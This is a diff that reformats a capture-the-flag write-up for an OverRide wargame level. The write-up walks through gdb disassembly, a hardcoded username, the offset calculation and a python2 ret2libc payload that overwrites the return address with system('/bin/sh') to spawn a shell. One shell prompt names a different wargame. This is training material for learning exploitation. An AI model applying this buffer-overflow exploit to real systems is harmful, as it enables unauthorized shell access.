@@ -42,7 +42,7 @@ Non-debugging symbols:
 0x0804866c  _fini
 ```
 
-The main function creates a buffer and subsequently clears it. then it prompts the user to enter a username using the fgets function and stores the content in a global variable called "a_user_name."
+The `main` function creates a buffer and subsequently clears it. then it prompts the user to enter a username using the `fgets` function and stores the content in a global variable called `"a_user_name"`.
 
 ```c
    0x080484d8 <+8>: sub    esp,0x60
@@ -65,7 +65,7 @@ The main function creates a buffer and subsequently clears it. then it prompts t
    0x08048528 <+88>: call   0x8048370 <fgets@plt>
 ```
 
-The program then calls the verify_user_name() function, which compares the "a_user_name" variable to a string called "dat_wil" that is no longer than 7 characters using the strncmp function.
+The program then calls the `verify_user_name()` function, which compares the `"a_user_name"` variable to a string called `"dat_wil"` that is no longer than 7 characters using the `strncmp` function.
 
 ```s
 (gdb) disas verify_user_name
@@ -96,7 +96,7 @@ Dump of assembler code for function verify_user_name:
    0x080484a2 <+62>: ret
 ```
 
-If the result of the comparison is not equal to 0, the program displays "nope, incorrect username...\n." Otherwise, the program prompts the user to enter a password, which is then stored in a buffer using the fgets function.
+If the result of the comparison is not equal to `0`, the program displays `"nope, incorrect username...\n."` Otherwise, the program prompts the user to enter a password, which is then stored in a buffer using the `fgets` function.
 
 ```s
    0x08048532 <+98>: mov    DWORD PTR [esp+0x5c],eax
@@ -116,7 +116,7 @@ If the result of the comparison is not equal to 0, the program displays "nope, i
    0x08048574 <+164>: call   0x8048370 <fgets@plt>
 ```
 
-The buffer is then passed as a parameter to the verify_user_pass function, which compares the buffer to the string "admin" that is no longer than 5 characters using the strncmp function.
+The buffer is then passed as a parameter to the `verify_user_pass` function, which compares the buffer to the string `"admin"` that is no longer than 5 characters using the `strncmp` function.
 
 ```s
 (gdb) disas verify_user_pass
@@ -144,7 +144,7 @@ Dump of assembler code for function verify_user_pass:
    0x080484cf <+44>: ret
 ```
 
-If the result of the comparison is equal to 0, the program displays "nope, incorrect password...\n." Otherwise, the program outputs the same message.
+If the result of the comparison is equal to `0`, the program displays `"nope, incorrect password...\n."` Otherwise, the program outputs the same message.
 
 ```s
    0x08048585 <+181>: mov    DWORD PTR [esp+0x5c],eax
@@ -158,14 +158,14 @@ If the result of the comparison is equal to 0, the program displays "nope, incor
    0x080485a8 <+216>: jmp    0x80485af <main+223>
 ```
 
-Upon analyzing the code, it becomes apparent that the size specified in the second fgets() function, along with the address of esp+0x1c (which points to the buffer), will exceed the address of EBP by 24 bytes. Armed with this knowledge, it is possible to change the return address of the main function to a new address within the system function, while also passing the "/bin/sh" parameter. However, in order to do this, it was necessary to determine the offset between the buffer and the return address. Consequently, I calculated the offset in the following manner:
+Upon analyzing the code, it becomes apparent that the size specified in the second `fgets()` function, along with the address of `esp+0x1c` (which points to the buffer), will exceed the address of `EBP` by 24 bytes. Armed with this knowledge, it is possible to change the return address of the `main` function to a new address within the `system` function, while also passing the "/bin/sh" parameter. However, in order to do this, it was necessary to determine the offset between the buffer and the return address. Consequently, I calculated the offset in the following manner:
 
 ```sh
 >>> (0xffffd6e8 + 0x4) - 0xffffd69c // (EBP + 0x4 <=> return) - address of the buffer
 80
 ```
 
-Next, I needed to locate the address of the system function and determine how to pass the "/bin/sh" parameter to it. To achieve this, I followed these steps:
+Next, I needed to locate the address of the system function and determine how to pass the `"/bin/sh"` parameter to it. To achieve this, I followed these steps:
 
 ```s
 (gdb) p system
@@ -196,13 +196,13 @@ Mapped address spaces:
 (gdb)
 ```
 
-To fill the buffer with the necessary information, I used Python to generate a string consisting of As that would overwrite the return address with the address of the system function. Additionally, I included randomly generated data for the return address of the system() function and the address of the "/bin/sh" parameter.
+To fill the buffer with the necessary information, I used Python to generate a string consisting of As that would overwrite the return address with the address of the system function. Additionally, I included randomly generated data for the return address of the `system()` function and the address of the "/bin/sh" parameter.
 
 ```sh
 level2@RainFall:~$ python2 -c  'print("A" * 80 + "\xf7\xe6\xae\xd0"[::-1] + "BBBB" + "\xf7\xf8\x97\xec"[::-1])' > /tmp/flag
 ```
 
-Finally, all that remains is to input the "dat_wil" user as the first input, and the previously generated string as the second input. And that's all there is to it!
+Finally, all that remains is to input the `"dat_wil"` user as the first input, and the previously generated string as the second input. And that's all there is to it!
 
 ```sh
 level01@OverRide:~$ (echo dat_wil; cat /tmp/flag -) | ./level01
